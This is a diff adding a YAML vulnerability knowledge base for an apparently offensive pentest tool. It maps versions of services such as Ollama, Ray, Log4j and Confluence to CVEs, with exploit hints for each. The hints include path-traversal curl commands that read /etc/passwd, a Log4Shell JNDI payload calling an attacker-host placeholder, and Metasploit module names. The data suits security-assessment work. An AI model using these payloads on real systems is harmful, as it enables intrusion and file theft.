@@ -1,0 +1,466 @@
+# Yhwach — offline CPE/version -> CVE knowledge base.
+#
+# Curated for services commonly found in security-assessment labs, with
+# the AI-stack CVEs first (Yhwach doctrine ranks AI hosts above traditional).
+# `yhwach vulns` matches each `software` row against these entries and records a
+# `vulnerability` row; entries with an `exploit` also emit an `exploitable_cve`
+# finding so the exploit_known_cve rule can chain.
+#
+# Match:  entry matches a software row when (product substring in software.name
+#         OR cpe substring in software.cpe), case-insensitive, AND the software
+#         version satisfies `affected`.
+# affected grammar:  "<x" "<=x" ">x" ">=x" "==x", comma-AND ranges (">=2.0,<2.17.1"),
+#         or "*" (any version — version-agnostic, e.g. an unauth-by-default service).
+
+# ---- AI stack (ranked first) ------------------------------------------------
+- product: ollama
+  cpe: ollama
+  affected: "<0.1.34"
+  cve: CVE-2024-37032
+  cvss: 9.8
+  title: "Ollama path traversal -> RCE (Probllama)"
+  exploit: "msf: exploit/linux/http/ollama_path_traversal_rce; nuclei CVE-2024-37032"
+
+- product: mlflow
+  cpe: mlflow
+  affected: "<2.9.2"
+  cve: CVE-2023-6014
+  cvss: 9.8
+  title: "MLflow auth bypass -> LFI / RCE"
+  exploit: "searchsploit mlflow; nuclei CVE-2023-6014"
+
+- product: ray
+  cpe: ray
+  affected: "<2.8.1"
+  cve: CVE-2023-48022
+  cvss: 9.8
+  title: "Ray Jobs API unauth RCE (ShadowRay)"
+  exploit: "msf: exploit/linux/http/ray_jobs_api_rce; /api/jobs/ command injection"
+
+- product: gradio
+  cpe: gradio
+  affected: "<4.11.0"
+  cve: CVE-2023-51449
+  cvss: 7.5
+  title: "Gradio /file= path traversal (arbitrary file read)"
+  exploit: "curl '$URL/file=/etc/passwd'"
+
+# ---- Web / app servers ------------------------------------------------------
+- product: apache activemq
+  cpe: activemq
+  affected: "<5.18.3"
+  cve: CVE-2023-46604
+  cvss: 10.0
+  title: "ActiveMQ OpenWire unauth RCE"
+  exploit: "msf: exploit/multi/misc/apache_activemq_rce_cve_2023_46604"
+
+- product: log4j
+  cpe: log4j
+  affected: ">=2.0,<2.17.1"
+  cve: CVE-2021-44228
+  cvss: 10.0
+  title: "Log4Shell JNDI RCE"
+  exploit: "${jndi:ldap://<KALI>/a} in any logged field; marshalsec + payload"
+
+- product: confluence
+  cpe: confluence
+  affected: ">=8.0.0,<8.5.4"
+  cve: CVE-2023-22518
+  cvss: 10.0
+  title: "Confluence improper authz -> takeover"
+  exploit: "nuclei CVE-2023-22518; /json/setup-restore.action"
+
+- product: gitlab
+  cpe: gitlab
+  affected: ">=16.1.0,<16.7.2"
+  cve: CVE-2023-7028
+  cvss: 10.0
+  title: "GitLab account takeover via password reset"
+  exploit: "reset to attacker email (double email[] param)"
+
+- product: jenkins
+  cpe: jenkins
+  affected: "<2.442"
+  cve: CVE-2024-23897
+  cvss: 9.8
+  title: "Jenkins CLI arbitrary file read (-> RCE)"
+  exploit: "msf: auxiliary/scanner/http/jenkins_cli_arbitrary_file_read"
+
+- product: grafana
+  cpe: grafana
+  affected: ">=8.0.0,<8.3.1"
+  cve: CVE-2021-43798
+  cvss: 7.5
+  title: "Grafana plugin path traversal (LFI)"
+  exploit: "curl '$URL/public/plugins/alertlist/../../../../../../etc/passwd'"
+
+- product: httpd
+  cpe: apache:http_server
+  affected: ">=2.4.49,<=2.4.50"
+  cve: CVE-2021-41773
+  cvss: 9.8
+  title: "Apache httpd path traversal -> RCE"
+  exploit: "msf: exploit/multi/http/apache_normalize_path_rce"
+
+- product: tomcat
+  cpe: tomcat
+  affected: "<9.0.31"
+  cve: CVE-2020-1938
+  cvss: 9.8
+  title: "Tomcat AJP file read/inclusion (Ghostcat)"
+  exploit: "msf: auxiliary/admin/http/tomcat_ghostcat (AJP 8009)"
+
+- product: webmin
+  cpe: webmin
+  affected: "<1.920"
+  cve: CVE-2019-15107
+  cvss: 9.8
+  title: "Webmin password_change unauth RCE"
+  exploit: "msf: exploit/linux/http/webmin_backdoor"
+
+# ---- Services / OS ----------------------------------------------------------
+- product: openssh
+  cpe: openssh
+  affected: ">=8.5,<9.8"
+  cve: CVE-2024-6387
+  cvss: 8.1
+  title: "OpenSSH signal-handler race RCE (regreSSHion)"
+  exploit: "PoC public; hard/unstable — verify version+glibc first"
+
+- product: samba
+  cpe: samba
+  affected: ">=3.5.0,<4.6.4"
+  cve: CVE-2017-7494
+  cvss: 9.8
+  title: "Samba is_known_pipename RCE (SambaCry)"
+  exploit: "msf: exploit/linux/samba/is_known_pipename"
+
+- product: vsftpd
+  cpe: vsftpd
+  affected: "==2.3.4"
+  cve: CVE-2011-2523
+  cvss: 9.8
+  title: "vsftpd 2.3.4 backdoor"
+  exploit: "msf: exploit/unix/ftp/vsftpd_234_backdoor"
+
+- product: proftpd
+  cpe: proftpd
+  affected: "==1.3.5"
+  cve: CVE-2015-3306
+  cvss: 10.0
+  title: "ProFTPD mod_copy unauth file copy -> RCE"
+  exploit: "SITE CPFR/CPTO to web root"
+
+- product: exim
+  cpe: exim
+  affected: ">=4.87,<4.92"
+  cve: CVE-2019-10149
+  cvss: 9.8
+  title: "Exim deliver_message RCE (The Return of the WIZard)"
+  exploit: "msf: exploit/linux/smtp/exim4_deliver_message"
+
+# ---- Local privilege escalation (post-foothold software rows) ----------------
+- product: sudo
+  cpe: sudo
+  affected: ">=1.8.2,<1.9.5p2"
+  cve: CVE-2021-3156
+  cvss: 7.8
+  title: "sudo heap overflow -> root (Baron Samedit)"
+  exploit: "searchsploit sudo baron samedit; exact libc-dependent PoC"
+
+- product: polkit
+  cpe: polkit
+  affected: "<0.120"
+  cve: CVE-2021-4034
+  cvss: 7.8
+  title: "polkit pkexec local root (PwnKit)"
+  exploit: "PwnKit PoC (blasty/berdav) — near-universal Linux local root"
+
+- product: linux kernel
+  cpe: linux:linux_kernel
+  affected: ">=5.8,<5.16.11"
+  cve: CVE-2022-0847
+  cvss: 7.8
+  title: "Linux kernel pipe overwrite -> root (Dirty Pipe)"
+  exploit: "Dirty Pipe PoC; overwrite /etc/passwd or a SUID binary"
+
+# ============================================================================
+# P1 expansion — NVD-verified (34 rows). AI infra, data stores, cloud-native,
+# and modern web apps. Container/k8s rows match post-foothold software rows;
+# webapp/datastore rows match -sV or a probe-recovered version.
+# ============================================================================
+
+# ---- AI stack ---------------------------------------------------------------
+- product: vllm
+  cpe: vllm
+  affected: ">=0.6.5,<0.8.5"
+  cve: CVE-2025-32444
+  cvss: 9.8
+  title: "vLLM Mooncake unauth pickle deserialization -> RCE (ZeroMQ)"
+  exploit: "unauth ZeroMQ recv_pyobj pickle RCE; needs mooncake integration; nuclei CVE-2025-32444"
+
+- product: litellm
+  cpe: litellm
+  affected: "<1.65.4"
+  cve: CVE-2024-6825
+  cvss: 8.8
+  title: "LiteLLM post_call_rules callback -> RCE"
+  exploit: "set os.system as a post_call_rules callback (needs proxy config access)"
+
+- product: flowise
+  cpe: flowise
+  affected: "<=2.2.6"
+  cve: CVE-2025-26319
+  cvss: 9.8
+  title: "Flowise unauth arbitrary file upload (/api/v1/attachments)"
+  exploit: "POST /api/v1/attachments unrestricted upload (CWE-434); searchsploit flowise"
+
+- product: langflow
+  cpe: langflow
+  affected: "<1.3.0"
+  cve: CVE-2025-3248
+  cvss: 9.8
+  title: "Langflow /api/v1/validate/code pre-auth RCE (CISA KEV)"
+  exploit: "nuclei CVE-2025-3248; POST /api/v1/validate/code code injection"
+
+- product: anythingllm
+  cpe: anything-llm
+  affected: "<1.3.1"
+  cve: CVE-2024-13059
+  cvss: 7.2
+  title: "AnythingLLM path traversal -> file write/RCE (non-ASCII traversal)"
+  exploit: "auth (manager/admin) req; multer non-ASCII filename traversal -> arbitrary write"
+
+- product: triton
+  cpe: triton
+  affected: ">=20.10,<24.04"
+  cve: CVE-2024-0087
+  cvss: 8.8
+  title: "NVIDIA Triton arbitrary log-file write -> potential code exec"
+  exploit: "set log location to an arbitrary path via logging endpoint -> file write"
+
+- product: qdrant
+  cpe: qdrant
+  affected: "<1.9.0"
+  cve: CVE-2024-3829
+  cvss: 9.1
+  title: "Qdrant snapshot-upload symlink -> arbitrary file read/write -> RCE"
+  exploit: "PUT /collections/{c}/snapshots/upload with a symlinked snapshot"
+
+- product: mlflow
+  cpe: mlflow
+  affected: "<2.2.1"
+  cve: CVE-2023-1177
+  cvss: 9.8
+  title: "MLflow path traversal arbitrary file read (LFI)"
+  exploit: "searchsploit mlflow; traversal in artifact/model path; nuclei CVE-2023-1177"
+
+- product: ray
+  cpe: ray
+  affected: "<2.8.1"
+  cve: CVE-2023-6019
+  cvss: 9.8
+  title: "Ray dashboard cpu_profile command injection (unauth RCE)"
+  exploit: "unauth cmd injection via cpu_profile param on dashboard :8265"
+
+# ---- Data stores ------------------------------------------------------------
+- product: redis
+  cpe: redis
+  affected: "<=8.2.1"
+  cve: CVE-2025-49844
+  cvss: 9.9
+  title: "Redis Lua use-after-free -> RCE (RediShell)"
+  exploit: "auth'd EVAL crafted Lua triggers UAF -> RCE; PoC public"
+
+- product: redis
+  cpe: redis
+  affected: "*"
+  cve: CVE-2022-0543
+  cvss: 10.0
+  title: "Redis Debian/Ubuntu Lua sandbox escape -> RCE"
+  exploit: "msf: exploit/linux/redis/redis_debian_sandbox_escape (Debian/Ubuntu pkg only)"
+
+- product: redis
+  cpe: redis
+  affected: ">=2.8.18,<7.4.1"
+  cve: CVE-2024-31449
+  cvss: 8.8
+  title: "Redis Lua bit-library stack overflow -> RCE (fix 6.2.16/7.2.6/7.4.1)"
+  exploit: "auth'd EVAL crafted Lua stack overflow; PoC public"
+
+- product: elasticsearch
+  cpe: elastic:elasticsearch
+  affected: "<1.4.3"
+  cve: CVE-2015-1427
+  cvss: 9.8
+  title: "Elasticsearch Groovy scripting sandbox bypass -> RCE"
+  exploit: "msf: exploit/multi/elasticsearch/search_groovy_script"
+
+- product: kibana
+  cpe: kibana
+  affected: "<6.6.1"
+  cve: CVE-2019-7609
+  cvss: 10.0
+  title: "Kibana Timelion prototype-pollution RCE (also <5.6.15)"
+  exploit: "Timelion .props() prototype pollution RCE; PoC public"
+
+- product: kafka
+  cpe: kafka
+  affected: ">=2.3.0,<=3.3.2"
+  cve: CVE-2023-25194
+  cvss: 8.8
+  title: "Kafka Connect JndiLoginModule JNDI/deserialization -> RCE"
+  exploit: "connector config sasl.jaas.config=JndiLoginModule -> JNDI (needs Connect REST access)"
+
+# ---- Kubernetes / cloud / containers ----------------------------------------
+- product: kubernetes
+  cpe: kubernetes
+  affected: "<1.12.3"
+  cve: CVE-2018-1002105
+  cvss: 9.8
+  title: "Kubernetes kube-apiserver upgrade-proxy privesc (fix 1.10.11/1.11.5/1.12.3)"
+  exploit: "unauth upgrade-request proxied to backend API; PoC public"
+
+- product: ingress-nginx
+  cpe: ingress-nginx
+  affected: "<=1.12.0"
+  cve: CVE-2025-1974
+  cvss: 9.8
+  title: "ingress-nginx admission-controller config injection -> RCE (IngressNightmare; fix 1.11.5/1.12.1)"
+  exploit: "inject nginx directives via admission webhook (:8443) from pod network; PoC public"
+
+- product: nvidia-container-toolkit
+  cpe: container_toolkit
+  affected: "<=1.17.7"
+  cve: CVE-2025-23266
+  cvss: 9.0
+  title: "NVIDIA Container Toolkit OCI-hook container escape (NVIDIAScape)"
+  exploit: "LD_PRELOAD via createContainer hook -> host root; PoC public"
+
+- product: runc
+  cpe: runc
+  affected: "<1.1.12"
+  cve: CVE-2024-21626
+  cvss: 8.6
+  title: "runc WORKDIR fd-leak container escape (Leaky Vessels)"
+  exploit: "WORKDIR /proc/self/fd/N -> host FS access / escape; PoC public"
+
+- product: containerd
+  cpe: containerd
+  affected: "<1.4.3"
+  cve: CVE-2020-15257
+  cvss: 5.2
+  title: "containerd-shim abstract-socket access -> privesc/escape (also <1.3.9)"
+  exploit: "host-net container reaches the containerd-shim abstract socket; PoC abstract_shimit"
+
+- product: argocd
+  cpe: argo_cd
+  affected: ">=1.4.0,<2.3.4"
+  cve: CVE-2022-29165
+  cvss: 10.0
+  title: "Argo CD JWT auth bypass when anonymous access enabled -> admin (fix 2.1.15/2.2.9/2.3.4)"
+  exploit: "blank/forged-signature JWT with anonymous access on; PoC public"
+
+- product: harbor
+  cpe: harbor
+  affected: ">=1.7.0,<=1.8.2"
+  cve: CVE-2019-16097
+  cvss: 6.5
+  title: "Harbor self-registration privesc -> admin (fix 1.7.6/1.8.3)"
+  exploit: "POST /api/users with has_admin_role=true (db auth + self-reg); searchsploit harbor"
+
+# ---- Webapps ----------------------------------------------------------------
+- product: teamcity
+  cpe: teamcity
+  affected: "<2023.11.4"
+  cve: CVE-2024-27198
+  cvss: 9.8
+  title: "JetBrains TeamCity auth bypass -> admin / RCE"
+  exploit: "nuclei CVE-2024-27198; msf jetbrains_teamcity auth-bypass module"
+
+- product: metabase
+  cpe: metabase
+  affected: "<0.46.6.1"
+  cve: CVE-2023-38646
+  cvss: 9.8
+  title: "Metabase pre-auth RCE via leaked setup-token (EE <1.46.6.1)"
+  exploit: "msf: exploit/linux/http/metabase_setup_token_rce (token from /api/session/properties)"
+
+- product: nexus
+  cpe: nexus_repository
+  affected: ">=3.0.0,<3.68.1"
+  cve: CVE-2024-4956
+  cvss: 7.5
+  title: "Sonatype Nexus Repository 3 unauth path traversal (file read)"
+  exploit: "nuclei CVE-2024-4956; encoded ..%2F traversal"
+
+- product: superset
+  cpe: superset
+  affected: "<=2.0.1"
+  cve: CVE-2023-27524
+  cvss: 9.8
+  title: "Apache Superset default SECRET_KEY session forgery -> takeover/RCE"
+  exploit: "flask-unsign forge admin session; msf apache_superset_cookie_sig_rce"
+
+- product: minio
+  cpe: minio
+  affected: "<RELEASE.2024-01-31T20-20-33Z"
+  cve: CVE-2024-24747
+  cvss: 8.8
+  title: "MinIO access-key privilege escalation (child key inherits admin:*; fix 2024-01-31)"
+  exploit: "child access key inherits admin:* unless explicitly denied; mc admin"
+
+- product: sonarqube
+  cpe: sonarqube
+  affected: "<10.5"
+  cve: CVE-2024-47910
+  cvss: 7.2
+  title: "SonarQube admin-role GitHub-integration signed-JWT exfiltration (also <9.9.5 LTA)"
+  exploit: "auth'd (admin) modify GitHub integration -> leak pre-signed JWT (info disc)"
+
+- product: artifactory
+  cpe: artifactory
+  affected: "<7.84.6"
+  cve: CVE-2024-4142
+  cvss: 9.0
+  title: "JFrog Artifactory improper-input-validation privesc (low-priv/anon -> admin)"
+  exploit: "vendor advisory JFSA-2024-000634311; low-priv -> admin (branch fixes 7.55.17..7.84.6)"
+
+- product: jupyterhub
+  cpe: jupyterhub
+  affected: "<5.1.0"
+  cve: CVE-2024-41942
+  cvss: 7.2
+  title: "JupyterHub admin:users scope -> full admin privesc (also <4.1.6)"
+  exploit: "auth'd token w/ admin:users scope escalates self to admin=True"
+
+- product: nextcloud
+  cpe: nextcloud
+  affected: ">=28.0.0,<30.0.2"
+  cve: CVE-2024-52518
+  cvss: 5.4
+  title: "Nextcloud external-storage change w/o password confirmation (session required)"
+  exploit: "requires hijacked session; create/modify/delete external storage sans pw confirm"
+
+- product: wiki.js
+  cpe: wiki.js
+  affected: "<=2.5.307"
+  cve: CVE-2025-56643
+  cvss: 9.1
+  title: "Wiki.js JWT not invalidated on logout (session persistence, CWE-613)"
+  exploit: "captured JWT stays valid after logout; no server-side revocation"
+
+- product: gitea
+  cpe: gitea
+  affected: "==1.22.0"
+  cve: CVE-2024-6886
+  title: "Gitea 1.22.0 stored XSS via unsanitized URI scheme (fixed 1.22.1)"
+  exploit: "searchsploit gitea 1.22.0 XSS (EDB-52077); auth'd, triggers when victim views content"
+
+- product: confluence
+  cpe: confluence
+  affected: ">=8.0.0,<8.5.4"
+  cve: CVE-2023-22527
+  cvss: 9.8
+  title: "Confluence OGNL template-injection unauth RCE"
+  exploit: "nuclei CVE-2023-22527; msf exploit/multi/http/atlassian_confluence_rce_cve_2023_22527"
